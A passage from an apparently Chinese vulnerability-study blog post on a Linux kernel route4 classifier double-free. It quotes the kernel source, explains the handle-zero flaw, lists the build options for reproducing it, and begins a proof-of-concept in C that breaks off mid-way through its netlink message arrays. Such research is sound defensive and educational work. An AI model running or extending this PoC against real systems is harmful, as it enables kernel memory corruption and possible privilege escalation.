class="line">	<span class="keyword">int</span>			iif;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_result</span>	<span class="title">res</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_exts</span>		<span class="title">exts</span>;</span></span><br><span class="line">	u32			handle;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span>	*<span class="title">bkt</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span>	*<span class="title">tp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_work</span>		<span class="title">rwork</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以清晰的看见就是一个哈希桶，<code>tp-&gt;ops-&gt;get()</code>是会根据用户传入的<code>handle</code>找对应<code>route4_filter</code>，找到的话返回，没找到返回<code>null</code>。</p>
<p>接着调用<code>tp-&gt;ops-&gt;change()</code>函数，把<code>get()</code>函数找到的旧的过滤器也传入,<code>change</code>首先是会把新的过滤器插入到哈希桶即<code>route4_head</code>中，接着判断旧的过滤器<code>fold</code>是否存在，如果存在的话先把她从哈希桶中移出来，然后把他<code>kfree</code>掉。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_change</span><span class="params">(struct net *net, struct sk_buff *in_skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct tcf_proto *tp, <span class="keyword">unsigned</span> <span class="keyword">long</span> base, u32 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct nlattr **tca, <span class="keyword">void</span> **arg, u32 flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span> =</span> rtnl_dereference(tp-&gt;root);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span> **<span class="title">fp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> *<span class="title">fold</span>, *<span class="title">f1</span>, *<span class="title">pfp</span>, *<span class="title">f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> *<span class="title">b</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">opt</span> =</span> tca[TCA_OPTIONS];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">TCA_ROUTE4_MAX</span> + 1];</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> h, th;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">new</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (opt == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> handle ? -EINVAL : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, TCA_ROUTE4_MAX, opt,</span><br><span class="line">					  route4_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	fold = *arg;</span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; handle &amp;&amp; fold-&gt;handle != handle)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	err = -ENOBUFS;</span><br><span class="line">	f = kzalloc(<span class="keyword">sizeof</span>(struct route4_filter), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!f)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	err = tcf_exts_init(&amp;f-&gt;exts, net, TCA_ROUTE4_ACT, TCA_ROUTE4_POLICE);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		f-&gt;id = fold-&gt;id;</span><br><span class="line">		f-&gt;iif = fold-&gt;iif;</span><br><span class="line">		f-&gt;res = fold-&gt;res;</span><br><span class="line">		f-&gt;handle = fold-&gt;handle;</span><br><span class="line"></span><br><span class="line">		f-&gt;tp = fold-&gt;tp;</span><br><span class="line">		f-&gt;bkt = fold-&gt;bkt;</span><br><span class="line">		<span class="keyword">new</span> = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = route4_set_parms(net, tp, base, f, handle, head, tb,</span><br><span class="line">			       tca[TCA_RATE], <span class="keyword">new</span>, flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line"></span><br><span class="line">	h = from_hash(f-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">	fp = &amp;f-&gt;bkt-&gt;ht[h];</span><br><span class="line">	<span class="keyword">for</span> (pfp = rtnl_dereference(*fp);</span><br><span class="line">	     (f1 = rtnl_dereference(*fp)) != <span class="literal">NULL</span>;</span><br><span class="line">	     fp = &amp;f1-&gt;next)</span><br><span class="line">		<span class="keyword">if</span> (f-&gt;handle &lt; f1-&gt;handle)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	tcf_block_netif_keep_dst(tp-&gt;chain-&gt;block);</span><br><span class="line">	rcu_assign_pointer(f-&gt;next, f1);</span><br><span class="line">	rcu_assign_pointer(*fp, f);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	<span class="keyword">if</span> (f)</span><br><span class="line">		tcf_exts_destroy(&amp;f-&gt;exts);</span><br><span class="line">	kfree(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>关键文件就是出在了<code>route4_change</code>中把旧的过滤器即<code>struct route4_filter</code>结构体从哈希桶中移出来，然后把他<code>kfree</code>掉，但是看关键代码,首先使用if判断这个这个<code>fold</code>是否存在以及他的<code>handle</code>是否存在，还要满足<code>f-&gt;handle != fold-&gt;handle</code>才进入循环里从哈希桶中脱链，如果条件不满足那就进入下一个判断，这个判断只是判断<code>fold</code>是否存在，如果存在的话就表示旧的过滤器存在，然后把他<code>kfree</code>掉。</p>
<p>可见由于脱链时判断旧过滤器是否存在和<code>kfree</code>时判断旧过滤器是否存在的判断依据不一样，这就会导致歧义的出现。假设这样一种情况，旧过滤器的<code>handle</code>为0，就会导致这个旧的过滤器不会被脱链但是会被kfree。这就可以造成doublefree.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fold &amp;&amp; fold-&gt;handle &amp;&amp; f-&gt;handle != fold-&gt;handle) &#123;</span><br><span class="line">		th = to_hash(fold-&gt;handle);</span><br><span class="line">		h = from_hash(fold-&gt;handle &gt;&gt; <span class="number">16</span>);</span><br><span class="line">		b = rtnl_dereference(head-&gt;table[th]);</span><br><span class="line">		<span class="keyword">if</span> (b) &#123;</span><br><span class="line">			fp = &amp;b-&gt;ht[h];</span><br><span class="line">			<span class="keyword">for</span> (pfp = rtnl_dereference(*fp); pfp;</span><br><span class="line">			     fp = &amp;pfp-&gt;next, pfp = rtnl_dereference(*fp)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (pfp == fold) &#123;</span><br><span class="line">					rcu_assign_pointer(*fp, fold-&gt;next);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	route4_reset_fastmap(head);</span><br><span class="line">	*arg = f;</span><br><span class="line">	<span class="keyword">if</span> (fold) &#123;</span><br><span class="line">		tcf_unbind_filter(tp, &amp;fold-&gt;res);</span><br><span class="line">		tcf_exts_get_net(&amp;fold-&gt;exts);</span><br><span class="line">		tcf_queue_work(&amp;fold-&gt;rwork, route4_delete_filter_work);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先是得把漏洞模块编译进入内核，其次还要勾上几个编译选项,这些编译选项最好不要直接在.config中进行修改，因为有些编译选项依赖于其他的编译选项，所以最好是在<code>make menuconfig</code>中进行修改，想要查找某一个编译选项在什么位置可以使用menuconifg的快捷键<code>/</code>进行搜索。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_BINFMT_MISC=y</span><br><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y CONFIG_NET_SCH_QFQ=y</span><br><span class="line">CONFIG_NET_CLS_ACT=y CONFIG_NET_CLS_BASIC=y</span><br><span class="line">CONFIG_NET_SCH_SFQ=y</span><br><span class="line">CONFIG_NET_EMATCH_META=y</span><br><span class="line">CONFIG_E1000=y CONFIG_E1000E=y</span><br></pre></td></tr></table></figure>

<h3 id="poc学习"><a href="#poc学习" class="headerlink" title="poc学习"></a>poc学习</h3><p>poc如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ascii[<span class="number">17</span>];</span><br><span class="line">    <span class="keyword">size_t</span> i, j;</span><br><span class="line">    ascii[<span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        dprintf(<span class="number">2</span>, <span class="string">&quot;%02X &quot;</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i]);</span><br><span class="line">        <span class="keyword">if</span> (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &gt;= <span class="string">&#x27; &#x27;</span> &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i] &lt;= <span class="string">&#x27;~&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)data)[i];</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ascii[i % <span class="number">16</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">8</span> == <span class="number">0</span> || i + <span class="number">1</span> == size)</span><br><span class="line">        &#123;</span><br><span class="line">            dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i + <span class="number">1</span> == size)</span><br><span class="line">            &#123;</span><br><span class="line">                ascii[(i + <span class="number">1</span>) % <span class="number">16</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> &lt;= <span class="number">8</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span> (j = (i + <span class="number">1</span>) % <span class="number">16</span>; j &lt; <span class="number">16</span>; ++j)</span><br><span class="line">                &#123;</span><br><span class="line">                    dprintf(<span class="number">2</span>, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                dprintf(<span class="number">2</span>, <span class="string">&quot;|  %s \n&quot;</span>, ascii);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> newlink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">56</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = NEWLINK */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_change */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* string */</span></span><br><span class="line">        <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="number">16</span>, <span class="number">0x00</span>, <span class="number">18</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* nested nla_len, nla_type */</span></span><br><span class="line">        <span class="number">10</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;y&#x27;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> dellink[] = &#123;</span><br><span class="line">        <span class="comment">/* len */</span></span><br><span class="line">        <span class="number">40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* type = DELLINK */</span></span><br><span class="line">        <span class="number">17</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* flags = NLM_F_REQUEST | NLM_F_CREATE */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* seq */</span></span><br><span class="line">        <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* pid */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_family */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_ifindex */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* ifi_flags */</span></span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span 